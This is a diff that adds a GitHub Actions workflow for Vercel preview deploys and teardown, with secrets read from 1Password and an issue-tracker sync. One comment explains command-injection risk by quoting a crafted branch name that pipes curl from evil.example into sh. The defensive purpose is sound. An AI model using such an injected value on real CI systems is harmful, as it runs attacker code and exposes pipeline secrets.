@@ -1,0 +1,202 @@
+name: Deploy preview
+
+# Spins up a Vercel preview deploy for any PR that carries the
+# `deploy-preview` label, with a stable `<branch-slug>-<app>.rando-id.dev`
+# URL, and tears it down on close. Production + staging deploys run via
+# sibling workflows (`deploy-staging.yml`, `deploy-production.yml`);
+# Vercel's native git integration is OFF (disabled by `rando infra
+# setup` — D1 of the deploy strategy). See MAINTAINING.md → "Deploy
+# strategy" for the full picture.
+#
+# Secrets are resolved from a **1Password Environment** (not a Vault)
+# at job start. The only GitHub repo secret you need is
+# `OP_SERVICE_ACCOUNT_TOKEN`; everything else is read from the staging
+# environment (`ftd3n4l5egcfjai7f7tm2f7ytq`) via `op environment read`.
+#
+# Items expected in the staging Environment:
+#   - NEON_API_KEY            (only if RANDO_NEON_PROJECT_ID is set)
+#   - VERCEL_TOKEN
+#   - CLOUDFLARE_API_TOKEN
+#   - CLOUDFLARE_ACCOUNT_ID
+#   - JIRA_BASE_URL / JIRA_EMAIL / JIRA_API_TOKEN  (only when tracker.kind=jira)
+#
+# Optional repo variables (Settings → Secrets and variables → Actions → Variables):
+#   RANDO_NEON_PROJECT_ID         — needed only by the optional per-PR Neon branch steps
+#   TRACKER_ENABLED=false         — disables the issue-tracker sync step
+#   DEPLOY_PREVIEW_ENABLED=false  — disables this whole workflow (use until the
+#                                   Vercel projects exist; see #75, or during a
+#                                   Vercel daily-deploy-quota incident). Both
+#                                   branch-deploy AND teardown skip when set.
+
+on:
+  pull_request:
+    # `labeled` lets adding the `deploy-preview` label fire the deploy
+    # immediately, without forcing a re-push. The branch-deploy job's
+    # `if:` filters `labeled` events to ONLY the `deploy-preview` label
+    # so adding unrelated labels (e.g. `bug`) doesn't waste a quota
+    # slot. `unlabeled` deliberately omitted — removing the label
+    # shouldn't tear down the existing preview; `closed` handles cleanup.
+    types: [opened, synchronize, reopened, closed, labeled]
+    # NOTE: do NOT add `paths-ignore` here. It would apply to the
+    # `closed` event too — if a PR was deployed and then amended to
+    # remove all deploy-worthy changes before close, the workflow
+    # wouldn't fire and the teardown job would never run, orphaning
+    # Vercel custom domains and Cloudflare CNAMEs. Deploy-worthy
+    # filtering lives inside the branch-deploy job below via
+    # .github/actions/changes; teardown always runs on close.
+
+concurrency:
+  # Serialize per-PR so a quick close-after-open doesn't race the deploy job.
+  group: deploy-${{ github.event.pull_request.number }}
+  cancel-in-progress: false
+
+jobs:
+  branch-deploy:
+    # ALL PRs (human OR bot) are opt-in for previews: skip unless the
+    # PR has the `deploy-preview` label. Pre-D3, only Dependabot opted
+    # in by label and humans always previewed; flipped so every PR
+    # makes an explicit decision. Trade-off: contributors add a label
+    # when they want a preview (cheap), in exchange for Vercel's
+    # 100/day quota only burning on PRs that actually need validation.
+    # See .notes/process-deploy-strategy.spec.md (D3).
+    # Teardown stays unconditional below so closing always cleans up,
+    # even if the PR never had a preview.
+    if: >-
+      ${{
+        vars.DEPLOY_PREVIEW_ENABLED != 'false'
+        && github.event.action != 'closed'
+        && (
+          github.event.action != 'labeled'
+          || github.event.label.name == 'deploy-preview'
+        )
+        && contains(github.event.pull_request.labels.*.name, 'deploy-preview')
+      }}
+    name: Deploy preview
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+
+      - uses: ./.github/actions/setup
+        with:
+          install-cli: 'true'
+
+      # Compute which app workspaces are affected by this PR via the
+      # composite's per-workspace outputs (from Turbo's --filter=...[base]
+      # dry-run). Only those apps get a preview deploy; the rest skip.
+      # This subsumes the previous `code || shared` gate because Turbo
+      # already treats turbo.json / root package.json changes as
+      # touching every workspace.
+      - uses: ./.github/actions/changes
+        id: changes
+
+      - name: Compute affected apps
+        id: apps
+        run: |
+          APPS=""
+          [ "${{ steps.changes.outputs.api }}"   = "true" ] && APPS="${APPS},api"
+          [ "${{ steps.changes.outputs.web }}"   = "true" ] && APPS="${APPS},web"
+          [ "${{ steps.changes.outputs.admin }}" = "true" ] && APPS="${APPS},admin"
+          APPS="${APPS#,}"
+          echo "list=${APPS}" >> "$GITHUB_OUTPUT"
+          if [ -z "$APPS" ]; then
+            echo "::notice::No app workspaces affected — skipping preview deploys. Teardown stays unconditional on close."
+          else
+            echo "::notice::Affected apps: ${APPS}"
+          fi
+
+      # Stream the staging 1Password Environment into $GITHUB_ENV. Adding
+      # a new secret means adding it to the Environment in the 1Password
+      # UI — no workflow change required.
+      - uses: ./.github/actions/op-env
+        if: steps.apps.outputs.list != ''
+        with:
+          service-account-token: ${{ secrets.OP_SERVICE_ACCOUNT_TOKEN }}
+
+      # Optional: spin up a per-PR Neon branch off main so migrations and
+      # seed data are isolated. Requires RANDO_NEON_PROJECT_ID variable.
+      # - name: Create Neon branch
+      #   if: vars.RANDO_NEON_PROJECT_ID != '' && steps.apps.outputs.list != ''
+      #   run: rando db branch create ${{ vars.RANDO_NEON_PROJECT_ID }} pr-${{ github.event.pull_request.number }} --from main
+
+      - name: Trigger preview deploys
+        if: steps.apps.outputs.list != ''
+        # github.head_ref is user-influenceable (git allows a wide
+        # character set in branch names; a fork-PR head or a
+        # collaborator could craft `'); curl evil.example | sh #` and
+        # break out of the single-quoted arg). Plumb through env: so
+        # bash treats the value as data, never as script. APPS comes
+        # from our own composite output (steps.apps.outputs.list) —
+        # not user-influenceable — but env-ified for the same audit
+        # consistency as the rest of the workflow (#192 pattern).
+        env:
+          BRANCH: ${{ github.head_ref }}
+          APPS: ${{ steps.apps.outputs.list }}
+          FORCE_COLOR: '1'
+        run: rando deploy branch "$BRANCH" --stable-url --apps "$APPS"
+
+      # Issue tracker: each ticket referenced by this PR → In Review,
+      # plus a comment with the per-app stable deploy URLs (only the
+      # apps that actually deployed — empty bullet list would mislead).
+      # Soft-fails so a tracker hiccup doesn't fail the deploy job.
+      - id: refs
+        if: vars.TRACKER_ENABLED != 'false' && steps.apps.outputs.list != ''
+        uses: ./.github/actions/issue-refs
+
+      - name: Sync issues → In Review with deploy URLs
+        if: vars.TRACKER_ENABLED != 'false' && steps.apps.outputs.list != '' && steps.refs.outputs.keys != ''
+        # Every user-influenceable value used in shell is plumbed via
+        # env: blocks (CWE-77 prevention). github.head_ref + pr.html_url
+        # + the issue-keys output (whose source is PR title/body
+        # parsing — user-controlled) all go through env vars, not
+        # template interpolation. APPS is our own composite output;
+        # env-ified for consistency. Pattern from #192.
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          FORCE_COLOR: '1'
+          BRANCH: ${{ github.head_ref }}
+          PR_URL: ${{ github.event.pull_request.html_url }}
+          APPS: ${{ steps.apps.outputs.list }}
+          KEYS: ${{ steps.refs.outputs.keys }}
+        run: |
+          # Build a bullet list of stable URLs for each deployed app.
+          URL_LINES=""
+          IFS=',' read -ra APP_ARR <<< "$APPS"
+          for app in "${APP_ARR[@]}"; do
+            URL_LINES="${URL_LINES}- https://${BRANCH}-${app}.rando-id.dev"$'\n'
+          done
+          MSG=$(printf 'Branch deploy live:\n\n%s\nPR: %s' "$URL_LINES" "$PR_URL")
+          printf '%s\n' "$KEYS" | while IFS= read -r key; do
+            [ -z "$key" ] && continue
+            echo "→ $key in-review + comment"
+            rando issues lifecycle "$key" in-review --message "$MSG" || echo "(non-fatal: $key)"
+          done
+
+  teardown:
+    if: ${{ vars.DEPLOY_PREVIEW_ENABLED != 'false' && github.event.action == 'closed' }}
+    name: Teardown preview
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+
+      - uses: ./.github/actions/setup
+        with:
+          install-cli: 'true'
+
+      - uses: ./.github/actions/op-env
+        with:
+          service-account-token: ${{ secrets.OP_SERVICE_ACCOUNT_TOKEN }}
+
+      - name: Remove stable URLs
+        # Same CWE-77 concern as the branch-deploy step above —
+        # github.head_ref via env, not template interpolation.
+        env:
+          BRANCH: ${{ github.head_ref }}
+          FORCE_COLOR: '1'
+        run: rando deploy teardown "$BRANCH" --yes
+
+      # Optional: drop the per-PR Neon branch.
+      # - name: Delete Neon branch
+      #   if: vars.RANDO_NEON_PROJECT_ID != ''
+      #   run: rando db branch delete ${{ vars.RANDO_NEON_PROJECT_ID }} pr-${{ github.event.pull_request.number }} --yes
